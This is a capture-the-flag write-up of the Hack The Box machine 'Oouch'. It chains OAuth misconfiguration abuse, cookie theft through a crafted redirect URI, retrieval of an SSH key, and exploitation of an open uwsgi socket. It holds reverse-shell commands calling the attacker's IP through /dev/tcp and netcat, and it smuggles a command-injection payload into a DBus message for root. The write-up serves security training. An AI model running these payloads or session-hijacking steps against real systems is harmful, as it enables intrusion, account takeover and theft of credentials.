# Oouch HTB writeup

![](../../../.gitbook/assets/18770d6b18a2ddddb85de36878f71a3a.webp)

Oouch is one of the hard \(close to Insane\) boxes that will give you a lot of fun but also tons of frustration with a big dose of new technologies and web techniques. Prepare to study, investigate and get fun.

## Enum

### Port scans

As with every box, first is to execute some Nmap to discover open ports and execute basic script against those.

```bash
Running script with target Oouch/10.10.10.177
[*] Creating directory Oouch structure
[*] Running NMAP all ports to 10.10.10.177
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 16:21 CEST
Initiating Ping Scan at 16:21
Scanning 10.10.10.177 [2 ports]
Completed Ping Scan at 16:21, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 16:21
Scanning 10.10.10.177 [65535 ports]
Discovered open port 22/tcp on 10.10.10.177
Discovered open port 21/tcp on 10.10.10.177
Discovered open port 8000/tcp on 10.10.10.177
Completed Connect Scan at 16:21, 12.86s elapsed (65535 total ports)
Nmap scan report for 10.10.10.177
Host is up (0.040s latency).
Not shown: 64978 closed ports, 554 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
8000/tcp open  http-alt

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.94 seconds
```

```bash
[*] Running NMAP scripts to open ports
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 16:21 CEST
WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.10.177
Host is up (0.040s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.34
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
8000/tcp open  rtsp
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest:
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions:
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=5/15%Time=5EBEA581%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</
SF:h1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Req
SF:uest\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1
SF:>Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization
SF:\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth
SF:orization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.89 seconds
 xnaaro:parrot  /media/xnaaro/SSD/hackthebox/machines 
```

After initial enumeration I've found out `-T5` with Nmap missed a port, so built a script to enumerate ports with netcat. Here are the results with a new port \(5000\) discovered

```bash
$ bash /media/xnaaro/SSD/repos/hacking_scripts/bash_nmap.sh 10.10.10.177

port 21 open
port 22 open
port 5000 open
```

### Web fuzzing

The main website at port 8000 didn't have any valid response, just server error. So executed a fuzzer to discover vhosts on the server.

```bash
$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.177:8000 -H "Host: FUZZ.oouch.htb"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.177:8000
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.oouch.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 150
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

authorization           [Status: 200, Size: 1429, Words: 246, Lines: 32]
```

Discovered a vhost called `authorization`, then fuzzed it to discover other internal paths and files a unauthenticated and then with an authenticated cookie.

```bash
$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://authorization.oouch.htb:8000/FUZZ -s

home
login
signupbottom


$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://authorization.oouch.htb:8000/oauth/FUZZ -H "Cookie: sessionid=50cpf32nny6cfdxrymttfyd67gyuzo0u; csrftoken=LOADoAlKfCPTK2n6IPCjlhPJdSihc8XJYMenHN0XzlB2ummc9sC7kHTazJlghdaa" -s

applications
authorize
token
```

## FTP

Nmap gave as an FTP port opened with anonymous enabled, on the FTP there was only a file called `project.txt` with the following contents.

```text
$ cat project.txt

Flask -> Consumer
Django -> Authorization Server
```

This gave us an idea of what the server is running and what could be the vhosts names

* authorization.oouch.htb
* consumer.oouch.htb

## Abusing Oauth for foothold

Once tried some user creation, login, authorizations, etc. I understood the behaviour and the technology behind all of this, in this case was Oauth2. This box gave me the opportunity to study this technology with some blogs and an Udemy course.

One of the blogs I've found was this, were the author explains how could possibly get other's account in an miscofigured Oauth implementation: [https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/)

### qtc user on consumer

The whole process to steal a user session was:

* Create test account in both sites consumer and authentication
* Open burp and intercept requests
* Create authorization token opening [http://consumer.oouch.htb:5000/oauth/connect](http://consumer.oouch.htb:5000/oauth/connect)
* Forward requests until you get a token, copy URL and drop connection so the token is not used
  * Example token request GET [http://consumer.oouch.htb:5000/oauth/connect/token?code=lS4keIqjkFY7FkZz2OUKBu1lamtS4s](http://consumer.oouch.htb:5000/oauth/connect/token?code=lS4keIqjkFY7FkZz2OUKBu1lamtS4s)
* Send malicious message to the admin in /contact and wait ~30 seconds
* Logout
* Login at [http://consumer.oouch.htb:5000/oauth/login](http://consumer.oouch.htb:5000/oauth/login)
* You got qtc user :\)

On the /Documents path there was this juicy information.

```bash
| dev_access.txt   | develop:supermegasecureklarabubu123! -> Allows application registration.    |
| o_auth_notes.txt | /api/get_user -> user data. oauth/authorize -> Now also supports GET method.|
| todo.txt         | Chris mentioned all users could obtain my ssh key. Must be a joke...        |
```

Now we have to steal the cookie of `qtc` user on authorization.

### qtc on authorization via SSRF

Next step is to create a client app at [http://authorization.oouch.htb:8000/oauth/applications/register](http://authorization.oouch.htb:8000/oauth/applications/register) with the login found on the documents.

* Use authorization\_code as client type
* Redirect url should be pointing to your netcat listener \(`http://1.2.3.4:4443`\)

Craft an auth request with the client\_id, client\_secret and redirect\_url created in the client.

Then send the auth request on the contact form again and wait ~30 seconds with your netcat listening on the correct port

```bash
http://authorization.oouch.htb:8000/oauth/authorize/?grant_type=authorization_code&client_id=<CLIENT_ID>&client_secret=<CLIENT_SECRET>&redirect_uri=http://10.10.14.34:4443
```

Once qtc clicks the link, will attempt to authorize in our client and get redirected to us, here we can steal his cookie on `authorization`.

```bash
$ rlwrap nc -nvlp 4443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
Ncat: Connection from 10.10.10.177.
Ncat: Connection from 10.10.10.177:32776.
GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
Host: 10.10.14.34:4443
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: sessionid=gp7p8lcttjmq4kyc93m4uzkdhi4yledq;
```

Now we can login as `qtc` on authorization with that cookie, change it on the browser or add it as header `Cookie: sessionid=<COOKIE>` in curl or python.

At this point we create a new client app as with type `client_credentials`.

Then we get a token on the new client to get a new valid token.

```bash
$ curl -X POST 'http://authorization.oouch.htb:8000/oauth/token/' -H "Content-Type: application/x-www-form-urlencoded" --data "grant_type=client_credentials&client_id=<CLIENT_ID>&client_secret=<CLIENT_SECRET>" -L -s
{"access_token": "iZAtci8ayDcYQsbCeBctfOj1MIpARK", "expires_in": 600, "token_type": "Bearer", "scope": "read write"}
```

Once we have a token and a cookie on authorization, get can get ssh information about `qtc` user, as Chris mentioned in the /documentation, copy the ssh\_key into a file.

```bash
curl -X GET 'http://authorization.oouch.htb:8000/api/get_ssh/?access_token=<TOKEN>' -H "Cookie: sessionid=<COOKIE>"

{"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAqQvHuKA1i28D1ldvVbFB8PL7ARxBNy8Ve/hfW/.............\n-----END OPENSSH PRIVATE KEY-----"}
```

The ssh key have \n as strings instead of parsed as real jump lines, so lets' replace it to fix the ssh private key syntax.

```bash
sed -i 's/\\n/\n/g' id_rsa_qtc
```

Set proper permissions to the key and connect to the box with `qtc` user.

```bash
$ chmod 600 id_rsa_qtc
$ ssh qtc@10.10.10.177 -i id_rsa_qtc
Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3

qtc@oouch:~$ cat user.txt
be510...................
```

## Local enumeration

First thing we see once we connect is `.note.txt` inside `qtc`'s `$HOME` directory.

This file contents are really important as is the base information we need to do all the privesc process.

```bash
qtc@oouch:~$ cat .note.txt
Implementing an IPS using DBus and iptables == Genius
```

We noticed docker is running and there are some neighbours in the net aka containers running with those IPs.

```bash
qtc@oouch:~$ ip neighbour
10.10.10.2 dev ens34 lladdr 00:50:56:b9:f6:f9 REACHABLE
172.18.0.4 dev br-cc6c78e0c7d0 lladdr 02:42:ac:12:00:04 STALE
172.18.0.3 dev br-cc6c78e0c7d0 lladdr 02:42:ac:12:00:03 STALE
fe80::250:56ff:feb9:f6f9 dev ens34 lladdr 00:50:56:b9:f6:f9 router STALE
```

Try to connect through ssh to them, one of them will work

## Getting www-data

```bash
qtc@oouch:~$ ssh qtc@172.18.0.3
Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu May 21 17:00:56 2020 from 172.18.0.1
```

Inside the container, after full enumeration we end up focusing on `/code` directory

```bash
qtc@aeb4525789d8:/code$ ls -lsrta /code
total 52
4 -rw-r--r-- 1 root root  163 Feb 11 17:34 uwsgi.ini
4 -rwxr-xr-x 1 root root   89 Feb 11 17:34 start.sh
4 -rw-r--r-- 1 root root  241 Feb 11 17:34 requirements.txt
4 -rw-r--r-- 1 root root  724 Feb 11 17:34 nginx.conf
4 drwxr-xr-x 4 root root 4096 Feb 11 17:34 migrations
4 -r-------- 1 root root 2602 Feb 11 17:34 key
4 -rw-r--r-- 1 root root   23 Feb 11 17:34 consumer.py
4 -rw-r--r-- 1 root root  325 Feb 11 17:34 config.py
4 -r-------- 1 root root  568 Feb 11 17:34 authorized_keys
4 -rw-r--r-- 1 root root 1072 Feb 11 17:34 Dockerfile
4 drwxr-xr-x 4 root root 4096 Feb 11 17:34 .
4 drwxr-xr-x 5 root root 4096 Feb 11 17:34 oouch
4 drwxr-xr-x 1 root root 4096 Feb 25 12:33 ..
0 -rw-rw-rw- 1 root root    0 May 21 17:52 urls.txt
```

### Abusing uwsgi

Here we can see all the consumer app code. For now, we focus on uwsgi configuration, which have open permissions on the unix socket under `/tmp`

```text
qtc@aeb4525789d8:/code$ cat uwsgi.ini
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
```

After some google fu research, found this python exploit to take advance of the wsgi socket.

[https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi\_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)

The exploit needs to be fixed for python3 compatibility, change `sz` function as follows:

```python
# Original
def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    if sys.version_info[0] == 3: import bytes
    s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex')
    return s[::-1]

# Fixed
def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    s = bytes.fromhex(s)
    return s[::-1]
```

This container does not have netcat, wget or curl installed. You could use ftp or as I did, encode the exploit as base64 in your host and decode inside the box.

```text
qtc@aeb4525789d8:/tmp$ echo "IyEvdXNyL2Jpbi9weXRob24KIyBjb2Rpbmc6IHV0Zi04CiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMK X18gPT0gJ19fbWFpbl9fJzoKICAgIG1haW4oKQo=" | base64 -d > exploit.py
```

```text
Open a netcat listener in your host or in oouch box, and execute the exploit.

```sh
qtc@aeb4525789d8:/tmp$ python exploit.py -m unix -u uwsgi.socket -c "bash -c 'bash -i >& /dev/tcp/10.10.14.34/4443 0>&1'"
[*]Sending payload.
```

This will give us a shell as www-data on the container.

```bash
$ rlwrap nc -nvlp 4443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
Ncat: Connection from 10.10.10.177.
Ncat: Connection from 10.10.10.177:51688.
bash: cannot set terminal process group (4895): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
www-data@aeb4525789d8:/code$
```

## Root

During previous enumeration on /code and some code review, we saw what `.note.txt` said about dbus.

### Abusing DBUS

This is a excerpt of the vulnerable implementation found at `/code/oouch/`.

```python
www-data@aeb4525789d8:/code$ cat oouch/routes.py | grep bus
cat oouch/routes.py | grep bus
import dbus
    The contact page is required to abuse the Oauth vulnerabilities. This endpoint allows the user to send messages using a textfield.
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
            bus.close()
```

Found a similar exploit for a different application abusing dbus and got the proper syntax to exploit ours app. [https://www.exploit-db.com/exploits/46186](https://www.exploit-db.com/exploits/46186)

At this point, open another netcat listener and send a message to dbus with a reverse shell payload pointing to your listener.

```bash
www-data@aeb4525789d8:/code$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2>&1 | nc 10.10.14.34 4444 >/tmp/.0;"

< /bin/bash -i 2>&1 | nc 10.10.14.34 4444 >/tmp/.0;"
method return time=1590084712.982363 sender=:1.3 -> destination=:1.517 serial=3 reply_serial=2
   string "Carried out :D"
```

Now we got root on `oouch.htb` box.

```bash
$ rlwrap nc -nvlp 4444

Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.177.
Ncat: Connection from 10.10.10.177:50784.
bash: cannot set terminal process group (2502): Inappropriate ioctl for device
bash: no job control in this shell
root@oouch:/root# id
id
uid=0(root) gid=0(root) groups=0(root)

root@oouch:/root# hostname
hostname
oouch

root@oouch:/root# cat /root/root.txt
cat /root/root.txt
d98ef..........
```

This box was specially fun and frustrating, made me learn Oauth and investigate about dbus and uwsgi. Also good practice for csrf and ssrf techniques. Hope you enjoyed the whole process.

